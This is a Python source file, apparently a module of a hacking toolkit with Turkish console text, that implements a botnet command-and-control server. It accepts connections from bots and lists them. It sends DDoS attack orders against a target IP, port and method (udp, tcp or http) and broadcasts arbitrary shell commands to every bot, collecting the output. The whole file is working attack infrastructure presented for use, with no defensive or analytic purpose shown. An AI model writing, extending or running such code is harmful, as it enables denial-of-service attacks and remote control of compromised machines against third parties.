import socket
import threading
import time
import random
from rich.console import Console
from rich.table import Table

console = Console()

botnet_nodes = {}
botnet_listener = None
botnet_running = False


def start_botnet_listener(host, port):
    global botnet_running, botnet_listener

    try:
        botnet_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        botnet_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        botnet_listener.settimeout(1.0)
        botnet_listener.bind((host, port))
        botnet_listener.listen(50)
        botnet_running = True
        console.print(f"\n[#a78bfa]  🌕 Botnet C2 aktif: {host}:{port}[/#a78bfa]")

        while botnet_running:
            try:
                conn, addr = botnet_listener.accept()
                nid = len(botnet_nodes) + 1
                botnet_nodes[nid] = {
                    "conn": conn,
                    "addr": addr,
                    "joined": time.strftime("%H:%M:%S"),
                    "alive": True
                }
                console.print(f"[#a78bfa]  Bot #{nid} katildi: {addr[0]}:{addr[1]}[/#a78bfa]")
            except socket.timeout:
                continue
            except OSError:
                break
    except Exception as e:
        console.print(f"[red]  Hata: {e}[/red]")
    finally:
        botnet_running = False


def stop_botnet():
    global botnet_running, botnet_listener
    botnet_running = False
    if botnet_listener:
        try:
            botnet_listener.close()
        except Exception:
            pass
    console.print("[#a78bfa]  Botnet durduruldu.[/#a78bfa]")


def list_bots():
    if not botnet_nodes:
        console.print("[dim]  Aktif bot yok.[/dim]")
        return

    table = Table(title="🌕 Botnet Nodes", border_style="purple", show_header=True, header_style="bold magenta")
    table.add_column("ID", style="bold #a78bfa", justify="center", width=4)
    table.add_column("IP", style="white", min_width=16)
    table.add_column("Port", style="dim", justify="center", width=6)
    table.add_column("Katilma", style="dim", width=10)
    table.add_column("Durum", style="bold", justify="center", width=7)

    for nid, info in botnet_nodes.items():
        alive = "[#a78bfa]AKTIF[/#a78bfa]" if info["alive"] else "[red]KAPALI[/red]"
        table.add_row(str(nid), info["addr"][0], str(info["addr"][1]), info["joined"], alive)

    console.print()
    console.print(table)
    active = sum(1 for n in botnet_nodes.values() if n["alive"])
    console.print(f"\n[dim]  Toplam: {len(botnet_nodes)} | Aktif: {active}[/dim]")


def send_attack_cmd(target_ip, target_port, method, duration, threads):
    cmd = f"ATTACK|{target_ip}|{target_port}|{method}|{duration}|{threads}"
    sent = 0
    for nid, info in botnet_nodes.items():
        if not info["alive"]:
            continue
        try:
            info["conn"].send(cmd.encode())
            sent += 1
        except Exception:
            info["alive"] = False
    console.print(f"[#a78bfa]  Saldiri komutu {sent} bot'a gonderildi.[/#a78bfa]")


def broadcast_cmd(cmd):
    sent = 0
    results = []
    for nid, info in botnet_nodes.items():
        if not info["alive"]:
            continue
        try:
            info["conn"].send(f"CMD|{cmd}".encode())
            info["conn"].settimeout(3)
            resp = info["conn"].recv(4096).decode("utf-8", errors="replace")
            results.append((nid, info["addr"][0], resp[:80]))
            sent += 1
        except Exception:
            info["alive"] = False
            results.append((nid, info["addr"][0], "[HATA]"))

    if results:
        table = Table(title="🌕 Botnet Broadcast", border_style="purple", show_header=True, header_style="bold magenta")
        table.add_column("ID", justify="center", width=4, style="bold #a78bfa")
        table.add_column("IP", style="white", width=16)
        table.add_column("Cikti", style="#a78bfa")
        for nid, ip, out in results:
            table.add_row(str(nid), ip, out.strip())
        console.print()
        console.print(table)


def run():
    global botnet_listener

    while True:
        console.print()
        console.print(f"  [bold purple]🌙 BOTNET C2[/bold purple]")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

        active = sum(1 for n in botnet_nodes.values() if n["alive"])
        status = "[#a78bfa]AKTIF[/#a78bfa]" if botnet_running else "[red]KAPALI[/red]"
        console.print(f"   Durum: {status}  |  Botlar: {active}")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
        console.print(f"   [#a78bfa]listen[/#a78bfa] [IP] [PORT]       C2 baslat")
        console.print(f"   [#a78bfa]stop[/#a78bfa]                     C2 durdur")
        console.print(f"   [#a78bfa]bots[/#a78bfa]                     Bot listesi")
        console.print(f"   [#a78bfa]attack[/#a78bfa]                   DDoS emri ver")
        console.print(f"   [#a78bfa]cmd[/#a78bfa] [KOMUT]              Toplu komut")
        console.print(f"   [#a78bfa]back[/#a78bfa]                     Geri don")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

        try:
            inp = console.input("\n[bold magenta]  botnet [/bold magenta][bold white]> [/bold white]").strip()
            parts = inp.split(maxsplit=1)
            if not parts:
                continue

            action = parts[0].lower()

            if action == "back":
                break

            elif action == "listen":
                if botnet_running:
                    console.print("[yellow]  Zaten calisiyor.[/yellow]")
                    continue
                args = parts[1].split() if len(parts) > 1 else []
                host = args[0] if args else "0.0.0.0"
                port = int(args[1]) if len(args) > 1 else 5555
                t = threading.Thread(target=start_botnet_listener, args=(host, port), daemon=True)
                t.start()
                time.sleep(0.5)

            elif action == "stop":
                stop_botnet()

            elif action == "bots":
                list_bots()

            elif action == "attack":
                target = console.input("[bold white]  Hedef IP: [/bold white]").strip()
                port = console.input("[bold white]  Hedef Port (80): [/bold white]").strip()
                port = int(port) if port.isdigit() else 80
                method = console.input("[bold white]  Metod (udp/tcp/http): [/bold white]").strip().lower()
                duration = console.input("[bold white]  Sure (30): [/bold white]").strip()
                duration = int(duration) if duration.isdigit() else 30
                threads = console.input("[bold white]  Thread (50): [/bold white]").strip()
                threads = int(threads) if threads.isdigit() else 50

                if target:
                    send_attack_cmd(target, port, method, duration, threads)

            elif action == "cmd":
                if len(parts) < 2:
                    console.print("[red]  Komut gerekli.[/red]")
                    continue
                broadcast_cmd(parts[1])

            else:
                console.print("[red]  Bilinmeyen komut.[/red]")

        except KeyboardInterrupt:
            break
        except ValueError:
            console.print("[red]  Gecersiz deger.[/red]")
        except Exception as e:
            console.print(f"[red]  Hata: {e}[/red]")
